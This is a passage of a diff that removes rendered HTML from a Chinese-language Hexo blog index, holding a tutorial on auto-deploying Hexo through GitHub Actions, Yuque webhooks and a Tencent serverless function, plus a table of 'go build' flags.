           <a class="article-more-a" href="/2020/09/13/yuque/go%20%E9%94%81%E7%9A%84%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/Hexo + Github + 语雀 + yuque-hexo +github-action+severless 打造全自动持续集成个人博客，云端写作，自动部署，完美体验~" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/06/yuque/Hexo%20+%20Github%20+%20%E8%AF%AD%E9%9B%80%20+%20yuque-hexo%20+github-action+severless%20%E6%89%93%E9%80%A0%E5%85%A8%E8%87%AA%E5%8A%A8%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%8C%E4%BA%91%E7%AB%AF%E5%86%99%E4%BD%9C%EF%BC%8C%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%EF%BC%8C%E5%AE%8C%E7%BE%8E%E4%BD%93%E9%AA%8C~/">Hexo + Github + 语雀 + yuque-hexo +github-action+severless 打造全自动持续集成个人博客，云端写作，自动部署，完美体验~</a>
-    </h1>
-  
-
-        
-        <a href="/2020/08/06/yuque/Hexo%20+%20Github%20+%20%E8%AF%AD%E9%9B%80%20+%20yuque-hexo%20+github-action+severless%20%E6%89%93%E9%80%A0%E5%85%A8%E8%87%AA%E5%8A%A8%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%8C%E4%BA%91%E7%AB%AF%E5%86%99%E4%BD%9C%EF%BC%8C%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%EF%BC%8C%E5%AE%8C%E7%BE%8E%E4%BD%93%E9%AA%8C~/" class="archive-article-date">
-  	<time datetime="2020-08-06T15:42:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-08-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="成本-0-元-30-元每年"><a href="#成本-0-元-30-元每年" class="headerlink" title="成本 0 元 / 30 元每年"></a>成本 0 元 / 30 元每年</h4><p>腾讯云/阿里云域名 30 元<br>腾讯云/阿里云云函数<br>hexo 站点工程<br>github 账户<br>语雀</p>
-<p>成果：<br>主站：<a target="_blank" rel="noopener" href="https://blog.murphyyi.com/">https://blog.murphyyi.com/</a><br>github：构建地址<a target="_blank" rel="noopener" href="https://github.com/zy84338719/hexo/actions">https://github.com/zy84338719/hexo/actions</a><br>仓库地址：</p>
-<h1 id="一、Hexo-Github-的痛点"><a href="#一、Hexo-Github-的痛点" class="headerlink" title="一、Hexo+Github 的痛点"></a>一、Hexo+Github 的痛点</h1><h3 id="1-为啥要用-hexo-github？"><a href="#1-为啥要用-hexo-github？" class="headerlink" title="1.为啥要用 hexo+github？"></a>1.为啥要用 hexo+github？</h3><p>作为一个程序猿，博客肯定是必须要有的拉，github 也是必须要混的拉~所以:</p>
-<ul>
-<li>hexo + github = 高大上</li>
-</ul>
-<p><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/155457/1546857679810-d82e3d46-e960-419c-a715-0a82c48a2fd6.jpeg#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&name=image.jpeg&originHeight=225&originWidth=225&size=6267&status=done&style=none&width=225" alt="image.jpeg"></p>
-<h3 id="2-蛋疼的写作体验"><a href="#2-蛋疼的写作体验" class="headerlink" title="2.蛋疼的写作体验"></a>2.蛋疼的写作体验</h3><p>使用 hexo，会面临如下问题：</p>
-<ul>
-<li>博客源码怎么管理？</li>
-<li>图片存在哪？</li>
-<li>如何编写 markdown 文件？</li>
-</ul>
-<p>相信很多人都在使用本地编辑器来写博客，那体验，真心蛋疼，比如说 vscode，可视化插件一般般，图片还不能复制黏贴，想插入个图片还要先保存成文件放在本地，然后再引用，啥？你说七牛云存储？哪有复制黏贴爽呀~<br>当然，博客源码可以使用 github-action 来做持续集成，想写博客或者换个电脑，clone 一下源仓库，写完 push 一下，就可以不用管了。but，比起独立站点的博客，如 wordpress，还是觉得写作体验有点不爽。</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2019/jpeg/155457/1546858156666-f3f7ae20-c7f8-49b9-849d-b4364f3685f7.jpeg#align=left&display=inline&height=213&margin=%5Bobject%20Object%5D&name=image.jpeg&originHeight=213&originWidth=237&size=5810&status=done&style=none&width=237" alt="image.jpeg"></p>
-<h1 id="二、具体流程"><a href="#二、具体流程" class="headerlink" title="二、具体流程"></a>二、具体流程</h1><ol>
-<li>Hexo 博客搭建好，将源码上传到 Github，私有还是公有库都可以</li>
-<li>在 Github 中开启 Github Actions 服务，配置 yaml 格式的 deploy 脚本</li>
-<li>注册语雀，创建知识库并发布一篇文章，必须发布过文章，因为 yuque-hexo 会删除 _posts 文件夹</li>
-<li>编写 serverless 函数，测试可以触发 Github Actions，获取触发地址</li>
-<li>配置语雀的 webhook，使其可调用 serverless 函数</li>
-<li>语雀编写文章后触发 Github Actions 实现 Hexo 的自动部署，生成静态文件并发布</li>
-</ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/190217/1596732283938-9607a4cf-1d21-4585-9952-7103b5956b83.png#align=left&display=inline&height=130&margin=%5Bobject%20Object%5D&originHeight=130&originWidth=722&size=0&status=done&style=none&width=722"><br><strong>下面以 Github Actions 将 Hexo 生成的静态页面推送到 Github Pages 举例</strong></p>
-<h3 id="创建-Github-Pages"><a href="#创建-Github-Pages" class="headerlink" title="创建 Github Pages"></a>创建 Github Pages</h3><ol>
-<li>登录 github</li>
-<li>创建项目，项目名字<code>username.github.io</code>，必须为公开库</li>
-</ol>
-<h3 id="创建-Hexo-博客并配置"><a href="#创建-Hexo-博客并配置" class="headerlink" title="创建 Hexo 博客并配置"></a>创建 Hexo 博客并配置</h3><p>可参考：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.zhwei.cn/go.html?u=aHR0cHM6Ly9zZWdtZW50ZmF1bHQuY29tL2EvMTE5MDAwMDAxNzk4Njc5NA==">超详细 Hexo+Github Page 搭建技术博客教程【持续更新】</a></li>
-<li>教程非常多，善用搜索</li>
-</ul>
-<p>配置完成，本地预览达到自己满意，编写文章发布一切搞定后就能继续了。</p>
-<p>搭建完成效果：<a target="_blank" rel="noopener" href="https://github.com/zy84338719/blog">https://github.com/zy84338719/blog</a><br>页面地址：<a target="_blank" rel="noopener" href="https://blog.murphyyi.com/">https://blog.murphyyi.com</a></p>
-<h1 id="三、配置-Github-Actions-脚本"><a href="#三、配置-Github-Actions-脚本" class="headerlink" title="三、配置 Github Actions 脚本"></a>三、配置 Github Actions 脚本</h1><p>两种方法配置，内容一样</p>
-<ol>
-<li>在 Hexo 源码仓库的页面选择 Actions–&gt;Set up a workflow yourself，进行网页编写</li>
-<li>在本地环境根目录创建.github/workflows 文件夹，里面放写好的 yaml 脚本</li>
-</ol>
-<p>脚本我以一种举例，其他方法同样可以实现，请查看<a target="_blank" rel="noopener" href="http://blog.murphyyi.com/">我的博客</a><br>如：<a href="xo/blob/master/.github/workflows/main.yml">我的例子</a></p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># workflow name</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">To</span> <span class="string">Github</span> <span class="string">Pages</span></span><br><span class="line"><span class="comment"># 当有 push 到仓库和外部触发的时候就运行</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>, <span class="string">repository_dispatch</span>]</span><br><span class="line"><span class="comment"># YUQUE_TOKEN</span></span><br><span class="line"><span class="comment"># Github_SSH_PRIVATE_KEY</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">Hexo</span> <span class="string">Public</span> <span class="string">To</span> <span class="string">Pages</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">env:</span></span><br><span class="line">      <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="comment"># check it to your workflow can access it</span></span><br><span class="line">    <span class="comment"># from: https://github.com/actions/checkout</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">Repository</span> <span class="string">master</span> <span class="string">branch</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/checkout@master</span></span><br><span class="line">    <span class="comment"># from: https://github.com/actions/setup-node</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node.js</span> <span class="number">10.</span><span class="string">x</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/setup-node@master</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="string">&quot;10.x&quot;</span></span><br><span class="line">    <span class="comment"># from https://github.com/x-cold/yuque-hexo</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Hexo</span> <span class="string">Dependencies</span> <span class="string">and</span> <span class="string">Generate</span> <span class="string">Public</span> <span class="string">Files</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="attr">YUQUE_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.YUQUE_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="string">-g</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span> <span class="string">yuque-hexo</span> <span class="string">-g</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">run</span> <span class="string">start</span></span><br><span class="line">    <span class="comment"># from https://github.com/peaceiris/actions-gh-pages</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">peaceiris/actions-gh-pages@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">deploy_key:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.Github_SSH_PRIVATE_KEY</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">external_repository:</span> <span class="string">用户名/仓库</span></span><br><span class="line">          <span class="attr">publish_branch:</span> <span class="string">master</span></span><br><span class="line">          <span class="attr">publish_dir:</span> <span class="string">./public</span></span><br><span class="line">          <span class="attr">commit_message:</span> <span class="string">$&#123;&#123;</span> <span class="string">github.event.head_commit.message</span> <span class="string">&#125;&#125;</span></span><br></pre></td></tr></table></figure>
-<p>这个脚本实现了发布 Hexo 的 Public 到 Pages，这只是一种方法，你也可以使用 hexo d 、API、github-pages-deploy-action 等形式进行发布。<br>但是现在你还不能运行，因为里面的隐藏参数还没有设置<br><img src="https://cdn.nlark.com/yuque/0/2020/png/190217/1596732133070-ccd4c30e-b0e9-4bdf-96e5-972d059d3f45.png#align=left&display=inline&height=868&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1736&originWidth=2692&size=896243&status=done&style=none&width=1346" alt="image.png"></p>
-<table>
-<thead>
-<tr>
-<th align="left">参数</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">YUQUE_TOKEN_INFO</td>
-<td align="left">从语雀获取的 TOKEN，语雀上点击个人头像 –&gt; 设置 –&gt; Token 即可获取，要在 Hexo 源仓库的 Settings–&gt;Secrets 中进行添加，对重要信息进行保密</td>
-</tr>
-<tr>
-<td align="left">ACCESS_TOKEN</td>
-<td align="left">是<code>SSH-Key</code>密钥中的私钥，需要在<code>Secrets</code>中进行添加，公钥（.pub）已经存储在 Github 中</td>
-</tr>
-</tbody></table>
-<h1 id="四、配置腾讯-serverless-云函数"><a href="#四、配置腾讯-serverless-云函数" class="headerlink" title="四、配置腾讯 serverless 云函数"></a>四、配置腾讯 serverless 云函数</h1><pre><code>  1. 登录腾讯云，搜索云函数，创建
-  1. 选择 `python`，2.7 和 3.6 都行，空白函数
-  1. 运行角色，`SCF_QcsRole`即可
-  1. 注意执行方法，有强制要求
-</code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/190217/1596730384266-b3f5c22e-ac6a-4543-8ecd-2915bcdc7282.png#align=left&display=inline&height=482&margin=%5Bobject%20Object%5D&originHeight=482&originWidth=889&size=0&status=done&style=none&width=889"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/190217/1596730384296-c85b1249-e902-4edf-9ab1-fb93d0626d01.png#align=left&display=inline&height=696&margin=%5Bobject%20Object%5D&originHeight=696&originWidth=892&size=0&status=done&style=none&width=892"><br>这里我使用的是 python 2.7</p>
-<p>python</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    r = requests.post(<span class="string">&quot;https://api.github.com/repos/用户名/仓库名/dispatches&quot;</span>,</span><br><span class="line">    json = &#123;<span class="string">&quot;event_type&quot;</span>: <span class="string">&quot;start&quot;</span>&#125;,</span><br><span class="line">    headers = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&#x27;curl/7.52.1&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/vnd.github.everest-preview+json&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;token Github访问Token&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">204</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This&#x27;s OK!&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> r.status_code</span><br></pre></td></tr></table></figure>
-<p>在函数代码中测试一下，如果 Actions 正常触发，大功告成</p>
-<pre><code>  1. 配置触发方式，保存，获取到 访问路径，后面要用到
-  - 触发方式：API 网关触发器
-  - API 服务类型：新建 API 服务
-  - API 服务：SCF_API_SERVICE
-  - 请求方法：ANY
-  - 发布环境：发布
-  - 鉴权方法：免鉴权
-  - 启动集成响应：未启用
-</code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/190217/1596730384298-e0fe2aa7-3059-44b2-bea3-4692d0a11861.png#align=left&display=inline&height=661&margin=%5Bobject%20Object%5D&originHeight=661&originWidth=903&size=0&status=done&style=none&width=903"></p>
-<h1 id="五、配置语雀"><a href="#五、配置语雀" class="headerlink" title="五、配置语雀"></a>五、配置语雀</h1><ol>
-<li>注册，登录<ol>
-<li>创建知识库–&gt;文档知识库–&gt;可见范围为互联网可见</li>
-<li>工作台–&gt;知识库–&gt;找到新创建的知识库，管理–&gt;设置–&gt;路径进行自定义，后面有用</li>
-</ol>
-</li>
-</ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/190217/1596729378392-5d23999e-99e3-40ea-b9d5-c8a287f28460.png#align=left&display=inline&height=694&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1388&originWidth=2080&size=239330&status=done&style=none&width=1040" alt="image.png"></p>
-<pre><code>  1. 工作台–&gt;知识库–&gt;找到新创建的知识库，管理–&gt;设置–&gt;开发者–&gt;名称任意。URL 为云函数的地址，即上面获取到的 **访问路径**
-</code></pre>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/190217/1596729424249-b1cba960-3f4c-4ea2-8b0e-9438f5fb15ff.png#align=left&display=inline&height=756&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1512&originWidth=2332&size=380511&status=done&style=none&width=1166" alt="image.png"><br>权限建议选择</p>
-<pre><code>  - 仅主动推送更新触发（强烈建议）
-  - 发布文档
-  - 更新文档
-  - 删除文档
-</code></pre>
-<p>可本地更新后 push 或者直接在 github 网页修改<br>先安装 <a target="_blank" rel="noopener" href="https://www.zhwei.cn/go.html?u=aHR0cHM6Ly9naXRodWIuY29tL3gtY29sZC95dXF1ZS1oZXhv">yuque-hexo</a></p>
-<p>bash</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install yuque-hexo --save</span><br></pre></td></tr></table></figure>
-<p>编辑 package.json 文件，添加以下内容<br>Npm 脚本 “start” 和 “yuqueConfig”，将操作命令合并为一个脚本，只需要执行 npm run start 即可完成语雀的同步和 Hexo 的清理和静态文件生成</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> ...</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;yuque-hexo clean &amp;&amp; yuque-hexo sync &amp;&amp; hexo clean &amp;&amp; hexo generate&quot;,</span><br><span class="line">    &quot;build&quot;: &quot;hexo generate&quot;,</span><br><span class="line">    &quot;clean&quot;: &quot;hexo clean&quot;,</span><br><span class="line">    &quot;deploy&quot;: &quot;hexo deploy&quot;,</span><br><span class="line">    &quot;server&quot;: &quot;hexo server&quot;</span><br><span class="line">  &#125;,</span><br><span class="line"> ...</span><br><span class="line">  &quot;yuqueConfig&quot;: &#123;</span><br><span class="line">    &quot;baseUrl&quot;: &quot;https://www.yuque.com/api/v2&quot;,</span><br><span class="line">    &quot;login&quot;: &quot;语雀个人路径&quot;,</span><br><span class="line">    &quot;repo&quot;: &quot;知识库名称&quot;,</span><br><span class="line">    &quot;mdNameFormat&quot;: &quot;title&quot;,</span><br><span class="line">    &quot;postPath&quot;: &quot;source/_posts&quot;,</span><br><span class="line">    &quot;onlyPublished&quot;: false</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>例子：<a target="_blank" rel="noopener" href="https://github.com/zy84338719/hexo/blob/master/package.json">https://github.com/zy84338719/hexo/blob/master/package.json</a></p>
-<h1 id="六、Come-on-发布文章"><a href="#六、Come-on-发布文章" class="headerlink" title="六、Come on 发布文章"></a>六、Come on 发布文章</h1><p>1</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/08/06/yuque/Hexo%20+%20Github%20+%20%E8%AF%AD%E9%9B%80%20+%20yuque-hexo%20+github-action+severless%20%E6%89%93%E9%80%A0%E5%85%A8%E8%87%AA%E5%8A%A8%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%8C%E4%BA%91%E7%AB%AF%E5%86%99%E4%BD%9C%EF%BC%8C%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%EF%BC%8C%E5%AE%8C%E7%BE%8E%E4%BD%93%E9%AA%8C~/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-yuque/go build 编译时的附加参数" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/05/22/yuque/go%20build%20%E7%BC%96%E8%AF%91%E6%97%B6%E7%9A%84%E9%99%84%E5%8A%A0%E5%8F%82%E6%95%B0/">go build 编译时的附加参数</a>
-    </h1>
-  
-
-        
-        <a href="/2020/05/22/yuque/go%20build%20%E7%BC%96%E8%AF%91%E6%97%B6%E7%9A%84%E9%99%84%E5%8A%A0%E5%8F%82%E6%95%B0/" class="archive-article-date">
-  	<time datetime="2020-05-22T05:22:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="go-build-编译时的附加参数"><a href="#go-build-编译时的附加参数" class="headerlink" title="go build 编译时的附加参数"></a>go build 编译时的附加参数</h2><p>go build 还有一些附加参数，可以显示更多的编译信息和更多的操作，详见下表所示。</p>
-<p>go build 编译时的附加参数</p>
-<table>
-<thead>
-<tr>
-<th>附加参数</th>
-<th>备   注</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>-v</td>
-<td>编译时显示包名</td>
-</tr>
-<tr>
-<td>-p n</td>
-<td>开启并发编译，默认情况下该值为 CPU 逻辑核数</td>
-</tr>
-<tr>
-<td>-a</td>
-<td>强制重新构建</td>
-</tr>
-<tr>
-<td>-n</td>
-<td>打印编译时会用到的所有命令，但不真正执行</td>
-</tr>
-<tr>
-<td>-x</td>
-<td>打印编译时会用到的所有命令</td>
-</tr>
-<tr>
-<td>-race</td>
-<td>开启竞态检测</td>
-</tr>
-</tbody></table>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/05/22/yuque/go%20build%20%E7%BC%96%E8%AF%91%E6%97%B6%E7%9A%84%E9%99%84%E5%8A%A0%E5%8F%82%E6%95%B0/">展开全文 >></a>
         </p>
       
 
